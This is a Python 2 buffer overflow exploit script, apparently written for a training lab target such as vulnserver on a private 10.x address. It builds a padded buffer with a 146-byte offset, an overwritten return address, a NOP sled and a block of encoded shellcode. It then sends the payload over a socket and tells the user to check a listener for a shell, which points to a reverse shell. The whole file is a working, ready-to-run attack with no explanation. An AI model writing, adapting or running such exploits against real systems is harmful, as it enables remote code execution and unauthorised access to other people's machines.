#!/usr/bin/python
import sys, socket
import os
from time import sleep


timeout = 5
#Add vulnerable server's IP address and port to connect
addr = ('10.10.154.65',31337)
#Add command to send prepended to the buffer, eg. 'TRUN .' for vulnserver.exe
cmd = ""
esp = "\xc3\x14\x04\x08"
offset = 146
buffer = "A" * offset

buf =  b""
buf += b"\xdb\xd6\xd9\x74\x24\xf4\xba\x8f\x20\x8a\x45\x5e\x29"
buf += b"\xc9\xb1\x52\x83\xee\xfc\x31\x56\x13\x03\xd9\x33\x68"
buf += b"\xb0\x19\xdb\xee\x3b\xe1\x1c\x8f\xb2\x04\x2d\x8f\xa1"
buf += b"\x4d\x1e\x3f\xa1\x03\x93\xb4\xe7\xb7\x20\xb8\x2f\xb8"
buf += b"\x81\x77\x16\xf7\x12\x2b\x6a\x96\x90\x36\xbf\x78\xa8"
buf += b"\xf8\xb2\x79\xed\xe5\x3f\x2b\xa6\x62\xed\xdb\xc3\x3f"
buf += b"\x2e\x50\x9f\xae\x36\x85\x68\xd0\x17\x18\xe2\x8b\xb7"
buf += b"\x9b\x27\xa0\xf1\x83\x24\x8d\x48\x38\x9e\x79\x4b\xe8"
buf += b"\xee\x82\xe0\xd5\xde\x70\xf8\x12\xd8\x6a\x8f\x6a\x1a"
buf += b"\x16\x88\xa9\x60\xcc\x1d\x29\xc2\x87\x86\x95\xf2\x44"
buf += b"\x50\x5e\xf8\x21\x16\x38\x1d\xb7\xfb\x33\x19\x3c\xfa"
buf += b"\x93\xab\x06\xd9\x37\xf7\xdd\x40\x6e\x5d\xb3\x7d\x70"
buf += b"\x3e\x6c\xd8\xfb\xd3\x79\x51\xa6\xbb\x4e\x58\x58\x3c"
buf += b"\xd9\xeb\x2b\x0e\x46\x40\xa3\x22\x0f\x4e\x34\x44\x3a"
buf += b"\x36\xaa\xbb\xc5\x47\xe3\x7f\x91\x17\x9b\x56\x9a\xf3"
buf += b"\x5b\x56\x4f\x53\x0b\xf8\x20\x14\xfb\xb8\x90\xfc\x11"
buf += b"\x37\xce\x1d\x1a\x9d\x67\xb7\xe1\x76\x82\x41\xda\x35"
buf += b"\xfa\x53\x1c\x3b\x46\xda\xfa\x51\xa8\x8b\x55\xce\x51"
buf += b"\x96\x2d\x6f\x9d\x0c\x48\xaf\x15\xa3\xad\x7e\xde\xce"
buf += b"\xbd\x17\x2e\x85\x9f\xbe\x31\x33\xb7\x5d\xa3\xd8\x47"
buf += b"\x2b\xd8\x76\x10\x7c\x2e\x8f\xf4\x90\x09\x39\xea\x68"
buf += b"\xcf\x02\xae\xb6\x2c\x8c\x2f\x3a\x08\xaa\x3f\x82\x91"
buf += b"\xf6\x6b\x5a\xc4\xa0\xc5\x1c\xbe\x02\xbf\xf6\x6d\xcd"
buf += b"\x57\x8e\x5d\xce\x21\x8f\x8b\xb8\xcd\x3e\x62\xfd\xf2"
buf += b"\x8f\xe2\x09\x8b\xed\x92\xf6\x46\xb6\xb3\x14\x42\xc3"
buf += b"\x5b\x81\x07\x6e\x06\x32\xf2\xad\x3f\xb1\xf6\x4d\xc4"
buf += b"\xa9\x73\x4b\x80\x6d\x68\x21\x99\x1b\x8e\x96\x9a\x09"



def final(addr,cmd,esp,timeout):
	nop = "\x90" * 16
	while True:
		try:
			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.settimeout(timeout)
			s.connect(addr)
#			s.recv(1024)
			s.send(cmd + buffer + esp + nop + buf)
			print "Sending shellcode with NOPs"
			s.close()
			sleep(1)
		except:
			print "Check listener for shell "
			return


final(addr,cmd,esp,timeout)
